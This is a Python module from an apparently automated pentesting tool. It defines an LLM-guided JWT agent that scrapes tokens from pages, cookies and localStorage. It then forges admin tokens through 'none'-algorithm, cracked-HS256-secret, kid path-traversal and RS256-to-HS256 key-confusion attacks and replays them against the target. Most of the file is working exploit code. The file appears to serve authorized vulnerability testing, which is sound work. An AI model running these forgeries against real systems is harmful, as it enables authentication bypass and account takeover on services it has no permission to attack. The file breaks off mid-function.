import asyncio
import json
import base64
import hmac
import hashlib
import jwt
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from loguru import logger

from bugtrace.agents.base import BaseAgent
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.core.validation_status import ValidationStatus
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)

class JWTAgent(BaseAgent):
    """
    JWTAgent - Expert in JWT analysis and exploitation.
    Follows the V4 Specialist pattern.
    """

    def __init__(self, event_bus=None):
        super().__init__("JWTAgent", "Authentication & Authorization Specialist", event_bus, agent_id="jwt_agent")
        self.intercepted_tokens = []
        self.findings = []
        self.max_brute_attempts = 1000 # Configurable

        # Queue consumption mode (Phase 20)
        self._queue_mode = False

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # Agent-specific fingerprint

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""
        
    def _setup_event_subscriptions(self):
        """Subscribe to token discovery events."""
        if self.event_bus:
            self.event_bus.subscribe("auth_token_found", self.handle_new_token)
            logger.info(f"[{self.name}] Subscribed to 'auth_token_found' events.")

    async def handle_new_token(self, data: Dict[str, Any]):
        """Callback when a new token is found by other agents."""
        token = data.get("token")
        source_url = data.get("url")
        location = data.get("location", "unknown")
        
        if token and token not in self.intercepted_tokens:
            self.intercepted_tokens.append(token)
            self.think(f"Intercepted new JWT from {source_url} ({location})")
            await self._analyze_and_exploit(token, source_url, location)

    async def run_loop(self):
        """Main loop for the agent (if started manually or via TeamOrchestrator)."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 JWT Specialist active and listening for tokens...", "INFO")
        
        while self.running:
            await asyncio.sleep(1) # Keep alive for event bus

    async def check_url(self, url: str) -> Dict:
        """Discover tokens on a page and analyze them."""
        tokens = await self._discover_tokens(url)
        for token, location in tokens:
            await self._analyze_and_exploit(token, url, location)
        return {
            "vulnerable": len(self.findings) > 0,
            "findings": self.findings
        }


    async def _scan_page_for_tokens(self, page, target_url, jwt_re, discovered):
        """Scan a single page for JWT tokens in various locations."""
        try:
            self.think(f"Scanning page: {target_url}")
            
            # Intercept headers
            auth_header_token = None
            async def handle_request(request):
                nonlocal auth_header_token
                auth = request.headers.get("authorization")
                if auth and "Bearer " in auth:
                    t = auth.split("Bearer ")[1]
                    if self._is_jwt(t):
                        auth_header_token = t

            page.on("request", handle_request)
            await page.goto(target_url, wait_until="networkidle", timeout=10000)
            
            # Check URL parameters
            await self._check_url_for_tokens(page.url, discovered)
            
            # Check page content
            await self._check_page_content_for_tokens(page, jwt_re, discovered)
            
            # Check storage
            await self._check_storage_for_tokens(page, discovered)
            
            if auth_header_token:
                discovered.append((auth_header_token, "header"))

        except Exception as e:
            logger.debug(f"Scan failed for {target_url}: {e}")

    async def _check_url_for_tokens(self, url, discovered):
        """Check URL parameters for JWT tokens."""
        from urllib.parse import urlparse, parse_qs
        
        p_curr = urlparse(url)
        p_params = parse_qs(p_curr.query)
        for val_list in p_params.values():
            for val in val_list:
                if self._is_jwt(val):
                    discovered.append((val, "url_param"))

    async def _check_page_content_for_tokens(self, page, jwt_re, discovered):
        """Check page links and text for JWT tokens."""
        data = await page.evaluate("""
            () => ({
                links: Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
                text: document.body.innerText,
                html: document.documentElement.innerHTML
            })
        """)

        # Check Links
        self._check_page_links_for_tokens(data['links'], discovered)

        # Check Text/HTML for JWT strings
        self._check_page_text_for_tokens(jwt_re, data, discovered)

    def _check_page_links_for_tokens(self, links: List[str], discovered: List):
        """Check page links for JWT tokens in URL parameters."""
        for link in links:
            self._check_single_link_for_tokens(link, discovered)

    def _check_single_link_for_tokens(self, link: str, discovered: List):
        """Check a single link for JWT tokens in URL parameters."""
        from urllib.parse import urlparse, parse_qs

        p_link = urlparse(link)
        l_params = parse_qs(p_link.query)
        for val_list in l_params.values():
            for val in val_list:
                if not self._is_jwt(val):
                    continue
                discovered.append((val, "link_param"))

    def _check_page_text_for_tokens(self, jwt_re, data: Dict, discovered: List):
        """Check page text and HTML for JWT token strings."""
        matches = jwt_re.findall(data['text']) + jwt_re.findall(data['html'])
        for m in matches:
            if not self._is_jwt(m):
                continue
            discovered.append((m, "body_text"))

    async def _check_storage_for_tokens(self, page, discovered):
        """Check cookies and localStorage for JWT tokens."""
        import json
        
        cookies = await page.context.cookies()
        for cookie in cookies:
            if self._is_jwt(cookie['value']):
                discovered.append((cookie['value'], "cookie"))
        
        storage = await page.evaluate("() => JSON.stringify(localStorage)")
        storage_dict = json.loads(storage)
        for k, v in storage_dict.items():
            if isinstance(v, str) and self._is_jwt(v):
                discovered.append((v, "localStorage"))


    async def _discover_tokens(self, url: str) -> List[Tuple[str, str]]:
        """Use browser to find JWTs in URL, cookies, local storage, page links, and body text."""
        from bugtrace.tools.visual.browser import browser_manager
        from urllib.parse import urlparse, parse_qs
        import re

        discovered = []
        self.think(f"🔍 Starting token discovery for {url}")

        jwt_re = re.compile(r'(eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*)')

        # Check initial URL parameters
        await self._check_url_for_tokens(url, discovered)

        async with browser_manager.get_page() as page:
            # Scan target URL
            await self._scan_page_for_tokens(page, url, jwt_re, discovered)

            # Heuristic: If nothing found, try root page
            if not discovered:
                root_url = self._get_root_url(url)
                if root_url:
                    self.think(f"No tokens found on target. Trying landing page: {root_url}")
                    await self._scan_page_for_tokens(page, root_url, jwt_re, discovered)

        return self._deduplicate_tokens(discovered)

    def _get_root_url(self, url: str):
        """Get root URL if current URL has a path."""
        from urllib.parse import urlparse

        p = urlparse(url)
        if p.path != "/" and p.path != "":
            return f"{p.scheme}://{p.netloc}/"
        return None

    def _deduplicate_tokens(self, discovered):
        """Remove duplicate tokens and log discoveries."""
        unique = {}
        for t, loc in discovered:
            if t not in unique:
                unique[t] = loc
                self.think(f"🎯 Discovered token at {loc}: {t[:20]}...")
        return list(unique.items())

    def _is_jwt(self, token: str) -> bool:
        """Heuristic to check if a string looks like a JWT."""
        parts = token.split('.')
        return len(parts) == 3 and all(len(p) > 4 for p in parts[:2])

    def _decode_token(self, token: str) -> Optional[Dict]:
        """Decode JWT parts without verification."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header = json.loads(self._base64_decode(parts[0]))
            payload = json.loads(self._base64_decode(parts[1]))
            signature = parts[2]
            
            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw": token
            }
        except Exception as e:
            logger.warning(f"[{self.name}] Failed to decode token: {e}")
            return None

    def _base64_decode(self, data: str) -> str:
        """Base64Url decode helper."""
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.urlsafe_b64decode(data).decode('utf-8')

    async def _get_llm_strategy(self, decoded: Dict, url: str, location: str) -> Optional[Dict]:
        """Ask LLM to analyze the token and propose an attack plan."""
        from bugtrace.utils.parsers import XmlParser
        
        prompt = f"""
        TARGET: {url}
        LOCATION: {location}
        JWT_HEADER: {json.dumps(decoded['header'])}
        JWT_PAYLOAD: {json.dumps(decoded['payload'])}
        
        Analyze this token. Is there a clear path to privilege escalation or authentication bypass?
        Generate a plan using known JWT attack vectors.
        """
        
        response = await llm_client.generate(
            prompt=prompt,
            module_name="JWT_AGENT",
            system_prompt=self.system_prompt
        )
        
        tags = ["thought", "plan", "payload", "target_location"]
        return XmlParser.extract_tags(response, tags)

    async def _verify_token_works(self, forged_token: str, url: str, location: str) -> bool:
        """
        Sends a request with the forged token to verify validation bypass.
        Improved to check response content for success indicators.
        """
        try:
            # Execute verification steps
            base_status, base_text, _ = await self._token_execute_baseline(url, location)
            status, text, final_attack_url = await self._token_execute_test(url, forged_token, location)

            # Log results
            self._token_log_verification(final_attack_url, base_status, status, base_text, text)

            # Analyze response
            return self._token_analyze_response(base_status, status, base_text, text)
        except Exception as e:
            logger.debug(f"Token verification failed: {e}")
            return False

    async def _token_execute_baseline(self, url: str, location: str) -> Tuple[int, str, str]:
        """Execute baseline request with invalid token."""
        return await self._token_make_request(url, "invalid.token.123", location)

    async def _token_execute_test(self, url: str, forged_token: str, location: str) -> Tuple[int, str, str]:
        """Execute test request with forged token."""
        return await self._token_make_request(url, forged_token, location)

    async def _token_make_request(self, target_url: str, token: str, loc: str) -> Tuple[int, str, str]:
        """Make HTTP request with token in appropriate location."""
        import aiohttp
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        headers = {}
        final_url = target_url

        if loc == "header":
            headers["Authorization"] = f"Bearer {token}"
        elif loc == "cookie":
            headers["Cookie"] = f"session={token}"
        elif "param" in loc or loc == "manual":
            final_url, headers = self._token_inject_param(target_url, token, loc, headers)

        async with orchestrator.session(DestinationType.TARGET) as session:
            async with session.get(final_url, headers=headers, timeout=5) as r:
                body = await r.text()
                return r.status, body, final_url

    def _token_inject_param(self, target_url: str, token: str, loc: str, headers: Dict) -> Tuple[str, Dict]:
        """Inject token into URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        p = urlparse(target_url)
        qs = parse_qs(p.query)

        found_param = False
        for k, v in qs.items():
            if any(self._is_jwt(val) for val in v):
                qs[k] = [token]
                found_param = True

        if not found_param and loc == "manual":
            qs["token"] = [token]

        new_query = urlencode(qs, doseq=True)
        final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))

        # Fallback for manual: also try as a header
        if loc == "manual" and not found_param:
            headers["Authorization"] = f"Bearer {token}"

        return final_url, headers

    def _token_log_verification(self, final_url: str, base_status: int, status: int, base_text: str, text: str):
        """Log verification attempt details."""
        self.think(f"Requesting: {final_url}")
        self.think(f"Verification: Base Status={base_status} vs Forged Status={status}")
        self.think(f"Base Body: '{base_text[:50]}...' | Forged Body: '{text[:50]}...'")

    def _token_analyze_response(self, base_status: int, status: int, base_text: str, text: str) -> bool:
        """Analyze response to determine if token validation was bypassed."""
        success_keywords = ["welcome", "admin", "logged in", "flag", "success", "bt7331", "role: admin", "MASTER_PASS", "ROOT_KEY"]
        fail_keywords = ["invalid", "unauthorized", "expired", "forbidden", "anonymous", "invalid token", "blocked"]

        text_lower = text.lower()
        base_text_lower = base_text.lower()

        # Check status code change
        if base_status in [401, 403] and status == 200:
            self.think("SUCCESS: Status code change detected (Error -> 200)")
            return True

        # Check content-based indicators
        if status == 200:
            # Success markers appeared
            for sk in success_keywords:
                if sk in text_lower and sk not in base_text_lower:
                    self.think(f"SUCCESS: Content-based indicator found '{sk}'")
                    return True

            # Fail markers disappeared
            for fk in fail_keywords:
                if fk in base_text_lower and fk not in text_lower:
                    self.think(f"SUCCESS: Content-based indicator - failure marker '{fk}' disappeared")
                    return True

        return False

    async def _check_none_algorithm(self, token: str, url: str, location: str) -> bool:
        """Attempt 'none' algorithm attack."""
        parts = token.split('.')
        if len(parts) != 3:
            return False

        header = self._none_alg_decode_header(parts)
        if not header:
            return False

        # Test all algorithm variations
        variations = ['none', 'None', 'NONE', 'nOnE']
        for alg in variations:
            if await self._none_alg_test_variant(alg, header, parts, url, location):
                return True

        return False

    def _none_alg_decode_header(self, parts: List[str]) -> Optional[Dict]:
        """Decode JWT header for none algorithm attack."""
        try:
            return json.loads(self._base64_decode(parts[0]))
        except (json.JSONDecodeError, ValueError, TypeError):
            return None

    async def _none_alg_test_variant(self, alg: str, header: Dict, parts: List[str], url: str, location: str) -> bool:
        """Test single 'none' algorithm variant."""
        # Build modified header
        new_header = header.copy()
        new_header['alg'] = alg

        h_json = json.dumps(new_header, separators=(',', ':')).encode()
        h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')

        # Build privileged payload
        p_b64 = self._none_alg_build_payload(parts)

        # Test both token formats
        if await self._none_alg_test_with_dot(h_b64, p_b64, alg, url, location):
            return True
        if await self._none_alg_test_without_dot(h_b64, p_b64, alg, url, location):
            return True

        return False

    def _none_alg_build_payload(self, parts: List[str]) -> str:
        """Build elevated privilege payload for none algorithm attack."""
        try:
            payload = json.loads(self._base64_decode(parts[1]))
            payload['admin'] = True
            payload['role'] = 'admin'
            p_json = json.dumps(payload, separators=(',', ':')).encode()
            return base64.urlsafe_b64encode(p_json).decode().strip('=')
        except Exception:
            return parts[1]  # Fallback to original

    async def _none_alg_test_with_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
        """Test none algorithm with trailing dot format."""
        forged_token = f"{h_b64}.{p_b64}."
        if await self._verify_token_works(forged_token, url, location):
            self.think(f"SUCCESS: 'none' algorithm bypass confirmed with alg={alg}")
            self.findings.append({
                "type": "JWT None Algorithm",
                "url": url,
                "parameter": "alg",
                "payload": f"alg:{alg}",
                "severity": normalize_severity("CRITICAL").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": f"JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to '{alg}', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
                "reproduction": f"# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to '{alg}'\n# 2. Remove signature (keep trailing dot)\n# Forged token: {forged_token[:50]}...",
                "http_request": f"GET {url} with forged token in Authorization header",
                "http_response": "200 OK with elevated privileges"
            })
            return True
        return False

    async def _none_alg_test_without_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
        """Test none algorithm without trailing dot format."""
        forged_token_nodot = f"{h_b64}.{p_b64}"
        if await self._verify_token_works(forged_token_nodot, url, location):
            self.think(f"SUCCESS: 'none' algorithm bypass (no dot) confirmed with alg={alg}")
            self.findings.append({
                "type": "JWT None Algorithm",
                "url": url,
                "parameter": "alg",
                "payload": f"alg:{alg} (no dot)",
                "severity": normalize_severity("CRITICAL").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": f"JWT None Algorithm bypass vulnerability (no trailing dot variant). The server accepts tokens with algorithm '{alg}' without a trailing dot, allowing complete signature bypass.",
                "reproduction": f"# Forge JWT with 'none' algorithm (no trailing dot):\n# Forged token: {forged_token_nodot[:50]}...",
                "http_request": f"GET {url} with forged token in Authorization header",
                "http_response": "200 OK with elevated privileges"
            })
            return True
        return False

    async def _attack_brute_force(self, token: str, url: str, location: str):
        """Offline dictionary attack on HMAC secret."""
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'HS256':
            return

        self.think("Starting dictionary attack on HS256 secret...")

        parts = token.split('.')
        signing_input, signature_actual = self._prepare_brute_force(parts)
        if not signature_actual:
            return

        wordlist = ["secret", "password", "123456", "jwt", "key", "auth", "admin", "token", "1234567890", "mysupersecret"]

        for secret in wordlist:
            if self._test_secret(signing_input, signature_actual, secret):
                await self._exploit_cracked_secret(secret, decoded, parts, token, url, location)
                return

    def _prepare_brute_force(self, parts: List[str]) -> Tuple[bytes, Optional[bytes]]:
        """Prepare signing input and signature for brute force."""
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            signature_actual = base64.urlsafe_b64decode(parts[2] + "==")
            return signing_input, signature_actual
        except (ValueError, TypeError):
            return signing_input, None

    def _test_secret(self, signing_input: bytes, signature_actual: bytes, secret: str) -> bool:
        """Test if secret matches signature."""
        h = hmac.new(secret.encode(), signing_input, hashlib.sha256)
        return h.digest() == signature_actual

    async def _exploit_cracked_secret(self, secret: str, decoded: Dict, parts: List[str], token: str, url: str, location: str):
        """Exploit cracked JWT secret by forging admin token."""
        self.think(f"🔥 CRITICAL: Found weak JWT secret: '{secret}'")

        forged_token = self._forge_admin_token(decoded, parts, secret)

        self.findings.append({
            "type": "Weak JWT Secret",
            "url": url,
            "parameter": "header",
            "payload": secret,
            "evidence": f"Secret cracked: {secret}. Forged admin token created.",
            "severity": normalize_severity("CRITICAL").value,
            "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
            "cve_id": "N/A",  # Vulnerability class, not specific CVE
            "remediation": get_remediation_for_vuln("JWT"),
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "description": f"Weak JWT secret discovered via dictionary attack. The HS256 signing secret is '{secret}', allowing attackers to forge arbitrary tokens including admin tokens.",
            "reproduction": f"# Crack JWT secret and forge admin token:\nimport jwt\nforged = jwt.encode({{'admin': True, 'role': 'admin'}}, '{secret}', algorithm='HS256')\nprint(forged)",
            "http_request": f"GET {url} with forged token",
            "http_response": "200 OK with admin privileges"
        })

        if await self._verify_token_works(forged_token, url, location):
            self.think("SUCCESS: Admin privilege escalation confirmed!")

    def _forge_admin_token(self, decoded: Dict, parts: List[str], secret: str) -> str:
        """Forge admin JWT token with cracked secret."""
        new_payload = decoded['payload'].copy()
        new_payload['admin'] = True
        new_payload['role'] = 'admin'
        if 'user' in new_payload:
            new_payload['user'] = 'admin'

        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

        new_signing_input = f"{parts[0]}.{p_b64}".encode()
        new_sig = hmac.new(secret.encode(), new_signing_input, hashlib.sha256).digest()
        new_sig_b64 = base64.urlsafe_b64encode(new_sig).decode().strip('=')

        return f"{parts[0]}.{p_b64}.{new_sig_b64}"

    async def _attack_kid_injection(self, token: str, url: str, location: str):
        """KID Injection for Directory Traversal / SQLi."""
        decoded = self._decode_token(token)
        if not decoded or 'kid' not in decoded['header']:
            return

        # Simple Directory Traversal Check
        # Try to make server use /dev/null (empty content) as key
        # Requires known alg (usually HS256 if we force it, or public key confusion)
        
        # Strategy: Change kid to /dev/null, sign with empty string
        new_header = decoded['header'].copy()
        new_header['kid'] = "../../../../../../../dev/null"
        # Force symmetric algebra if possible, or assume server treats key file content as symmetric key
        
        # This is a complex attack, usually requires signing with empty string
        h_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().strip('=')
        p_b64 = token.split('.')[1]
        
        signing_input = f"{h_b64}.{p_b64}".encode()
        # Sign with empty key (content of /dev/null)
        sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
        
        forged_token = f"{h_b64}.{p_b64}.{sig_b64}"
        
        if await self._verify_token_works(forged_token, url, location):
            self.think("SUCCESS: KID Directory Traversal confirmed (/dev/null bypass)")
            self.findings.append({
                "type": "JWT KID Injection",
                "url": url,
                "parameter": "kid",
                "payload": "../../../../../../../dev/null",
                "severity": normalize_severity("HIGH").value,
                "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
                "cve_id": "N/A",  # Vulnerability class, not specific CVE
                "remediation": get_remediation_for_vuln("JWT"),
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "description": "JWT KID (Key ID) injection via directory traversal. The 'kid' header parameter is vulnerable to path traversal, allowing use of /dev/null as the signing key (empty content). This enables forging valid tokens.",
                "reproduction": f"# Forge JWT with KID pointing to /dev/null:\n# 1. Set kid header to '../../../../../../../dev/null'\n# 2. Sign with empty key\n# Forged token: {forged_token[:60]}...",
                "http_request": f"GET {url} with forged token (kid: /dev/null)",
                "http_response": "200 OK with token accepted"
            })

    async def _attack_key_confusion(self, token: str, url: str, location: str):
        """
        Algorithm Confusion Attack (RS256 -> HS256).
        Tries to use the server's public key as the symmetric secret.
        """
        decoded = self._decode_token(token)
        if not decoded or decoded['header'].get('alg') != 'RS256':
            return

        self.think("Attempting Key Confusion (RS256 -> HS256)...")

        # Fetch public keys
        jwks_url, public_keys = await self._key_confusion_fetch_keys(url)
        if not public_keys:
            self.think("Skipping Key Confusion: No public key found.")
            return

        # Execute attack with all keys and formats
        await self._key_confusion_execute_attack(public_keys, decoded, url, location, jwks_url)

    async def _key_confusion_fetch_keys(self, url: str) -> Tuple[str, List]:
        """Fetch public keys from JWKS endpoint."""
        from urllib.parse import urlparse

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        jwks_url = f"{base_url}/.well-known/jwks.json"

        public_keys = await self._key_confusion_download_jwks(jwks_url)
        return jwks_url, public_keys

    async def _key_confusion_download_jwks(self, jwks_url: str) -> List:
        """Download and parse JWKS keys from URL."""
        try:
            async with orchestrator.session(DestinationType.TARGET) as session:
                async with session.get(jwks_url, timeout=5) as resp:
                    return await self._key_confusion_process_jwks_response(resp, jwks_url)
        except Exception as e:
            logger.debug(f"Failed to fetch JWKS: {e}")
            return []

    async def _key_confusion_process_jwks_response(self, resp, jwks_url: str) -> List:
        """Process JWKS HTTP response and parse keys."""
        if resp.status != 200:
            return []

        jwks = await resp.json()
        public_keys = self._key_confusion_parse_jwks(jwks)
        self.think(f"Found {len(public_keys)} public keys at {jwks_url}")
        return public_keys

    def _key_confusion_parse_jwks(self, jwks: Dict) -> List:
        """Parse JWK keys from JWKS response."""
        from jwt.algorithms import RSAAlgorithm

        public_keys = []
        for key in jwks.get('keys', []):
            parsed_key = self._key_confusion_parse_single_jwk(key)
            if parsed_key:
                public_keys.append(parsed_key)
        return public_keys

    def _key_confusion_parse_single_jwk(self, key: Dict):
        """Parse single JWK key."""
        from jwt.algorithms import RSAAlgorithm

        try:
            return RSAAlgorithm.from_jwk(json.dumps(key))
        except Exception as e:
            logger.debug(f"Failed to parse JWK: {e}")
            return None

    async def _key_confusion_execute_attack(self, public_keys: List, decoded: Dict, url: str, location: str, jwks_url: str):
        """Execute key confusion attack with all keys and formats."""
        from cryptography.hazmat.primitives import serialization

        formats_to_try = [
            serialization.PublicFormat.SubjectPublicKeyInfo,
            serialization.PublicFormat.PKCS1
        ]

        for key_obj in public_keys:
            for fmt in formats_to_try:
                if await self._key_confusion_test_format(key_obj, fmt, decoded, url, location, jwks_url):
                    return  # Success - stop trying

    async def _key_confusion_test_format(self, key_obj, fmt, decoded: Dict, url: str, location: str, jwks_url: str) -> bool:
        """Test single key format variant."""
        from cryptography.hazmat.primitives import serialization

        try:
            pub_key_pem = key_obj.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=fmt
            )

            forged_token = self._key_confusion_forge_token(pub_key_pem, decoded)
            self.think(f"Generated Token ({fmt.name}): {forged_token}")

            if await self._verify_token_works(forged_token, url, location):
                self._key_confusion_report_success(fmt, forged_token, url, jwks_url)
                return True

        except Exception:
            pass

        return False

    def _key_confusion_forge_token(self, pub_key_pem: bytes, decoded: Dict) -> str:
        """Forge JWT using public key as HMAC secret."""
        # Build header
        new_header = decoded['header'].copy()
        new_header['alg'] = 'HS256'
        h_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header, separators=(',', ':')).encode()
        ).decode().strip('=')

        # Build payload with elevated privileges
        new_payload = decoded['payload'].copy()
        new_payload['role'] = 'admin'
        new_payload['admin'] = True
        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')

        # Sign with public key as HMAC secret
        signing_input = f"{h_b64}.{p_b64}".encode()
        sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')

        return f"{h_b64}.{p_b64}.{sig_b64}"

    def _key_confusion_report_success(self, fmt, forged_token: str, url: str, jwks_url: str):
        """Report successful key confusion attack."""
        self.think(f"SUCCESS: Key Confusion (RS256->HS256) confirmed with format {fmt}!")
        self.findings.append({
            "type": "JWT Key Confusion",
            "url": url,
            "parameter": "alg",
            "payload": "RS256->HS256 with Public Key",
            "severity": normalize_severity("CRITICAL").value,
            "cwe_id": get_cwe_for_vuln("JWT"),  # CWE-347
            "cve_id": "N/A",  # Vulnerability class, not specific CVE
            "remediation": get_remediation_for_vuln("JWT"),
            "validated": True,
            "status": "VALIDATED_CONFIRMED",
            "description": f"JWT Algorithm Confusion vulnerability (RS256 to HS256). The server's public RSA key was used as an HMAC secret, allowing token forgery. Public key fetched from {jwks_url}.",
            "reproduction": f"# Key Confusion Attack:\n# 1. Fetch public key from {jwks_url}\n# 2. Change alg from RS256 to HS256\n# 3. Sign with public key PEM as HMAC secret\n# Forged token: {forged_token[:60]}...",
            "http_request": f"GET {url} with RS256->HS256 confused token",
            "http_response": "200 OK with elevated privileges"
        })

    async def _analyze_and_exploit(self, token: str, url: str, location: str):
        """Full analysis and exploitation pipeline for a single token."""
        try:
            # 1. Decode and Analyze (Passive)
            decoded = self._decode_token(token)
            if not decoded:
                return

            self.think(f"Token Analysis: Alg={decoded['header'].get('alg')}, Claims={list(decoded['payload'].keys())}")

            # 2. Get attack strategy
            strategy = await self._get_attack_strategy(decoded, url, location)

            # 3. Execute Attack Plan
            await self._execute_attack_plan(strategy, token, url, location)

        except Exception as e:
            logger.error(f"[{self.name}] Token analysis failed: {e}", exc_info=True)

    async def _get_attack_strategy(self, decoded: Dict, url: str, location: str) -> Dict:
        """Get attack strategy from LLM or use fallback."""
        strategy = await self._get_llm_strategy(decoded, url, location)
        if strategy:
            return strategy

        # Fallback to standard attacks if LLM fails
        return {"plan": ["Check None Algorithm", "Brute Force Secret", "Check KID Injection"]}

    async def _execute_attack_plan(self, strategy: Dict, token: str, url: str, location: str):
        """Execute attack plan steps."""
        plan_raw = strategy.get("plan")
        if not plan_raw:
            return

        steps = self._parse_plan_steps(plan_raw)
        for step in steps:
            self.think(f"Executing step: {step}")
            await self._execute_attack_step(step, token, url, location)

    def _parse_plan_steps(self, plan_raw) -> List[str]:
        """Parse plan into list of steps."""
        if isinstance(plan_raw, str):
            return [s.strip() for s in plan_raw.split('\n') if s.strip()]
        return plan_raw

    async def _execute_attack_step(self, step: str, token: str, url: str, location: str):
        """Execute a single attack step based on keyword matching."""
        step_lower = step.lower()

        if "none" in step_lower:
            await self._check_none_algorithm(token, url, location)
            return

        if "brute" in step_lower or "secret" in step_lower:
            await self._attack_brute_force(token, url, location)
            return

        if "kid" in step_lower or "injection" in step_lower:
            await self._attack_kid_injection(token, url, location)
            return

        if "confusion" in step_lower or "rsa" in step_lower or "hs256" in step_lower:
            await self._attack_key_confusion(token, url, location)
            return

    # ========================================
    # WET → DRY Two-Phase Processing (Phase A: Deduplication, Phase B: Exploitation)
    # ========================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        PHASE A: Drain WET findings from queue and deduplicate using LLM + fingerprint fallback.

        Returns:
            List of DRY (deduplicated) findings
        """
        import asyncio
        import time

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("jwt")
        wet_findings = []

        # Wait for queue to have items (timeout 300s)
        wait_start = time.monotonic()
        while (time.monotonic() - wait_start) < 300.0:
            if queue.depth() if hasattr(queue, 'depth') else 0 > 0:
                break
            await asyncio.sleep(0.5)

        # Drain all WET findings from queue
        logger.info(f"[{self.name}] Phase A: Queue has {queue.depth() if hasattr(queue, 'depth') else 0} items, starting drain...")

        stable_empty_count = 0
        drain_start = time.monotonic()

        while stable_empty_count < 10 and (time.monotonic() - drain_start) < 300.0:
            item = queue.get_nowait() if hasattr(queue, 'get_nowait') else None

            if item is None:
                stable_empty_count += 1
                await asyncio.sleep(0.5)
                continue

            stable_empty_count = 0

            finding = item.get("finding", {}) if isinstance(item, dict) else {}
            if finding:
                wet_findings.append(finding)

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings to process")
            return []

        # LLM-powered deduplication
        dry_list = await self._llm_analyze_and_dedup(wet_findings, self._scan_context)

        # Store for later phases
        self._dry_findings = dry_list

        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(wet_findings)} WET → {len(dry_list)} DRY ({len(wet_findings) - len(dry_list)} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
        Use LLM to intelligently deduplicate JWT findings.
        Falls back to fingerprint-based dedup if LLM fails.
        """
        prompt = f"""You are analyzing {len(wet_findings)} potential JWT vulnerability findings.

DEDUPLICATION RULES FOR JWT:
1. Same netloc (domain) + vuln_type = DUPLICATE (global per domain)
2. Different netloc = DIFFERENT vulnerabilities
3. Different vuln_type = DIFFERENT vulnerabilities (none_alg ≠ weak_secret ≠ kid_injection ≠ key_confusion)
4. JWT vulnerabilities are token-specific, NOT URL-specific (ignore paths/params)

EXAMPLES:
- example.com (none_alg) + example.com (none_alg) = DUPLICATE ✓
- example.com (none_alg) + example.com (weak_secret) = DIFFERENT ✗
- example.com (none_alg) + other.com (none_alg) = DIFFERENT ✗

WET FINDINGS (may contain duplicates):
{json.dumps(wet_findings, indent=2)}

Return ONLY unique findings in JSON format:
{{
  "findings": [
    {{"url": "...", "token": "...", "vuln_type": "...", ...}},
    ...
  ]
}}"""

        system_prompt = """You are an expert JWT deduplication analyst. Your job is to identify and remove duplicate JWT vulnerabilities while preserving unique token-based attacks. Focus on domain-level deduplication."""

        try:
            response = await llm_client.generate(
                prompt=prompt,
                system_prompt=system_prompt,
                module_name="JWT_DEDUP",
                temperature=0.2
            )

            # Parse LLM response
            result = json.loads(response)
            dry_list = result.get("findings", [])

            if dry_list:
                logger.info(f"[{self.name}] LLM deduplication successful: {len(wet_findings)} → {len(dry_list)}")
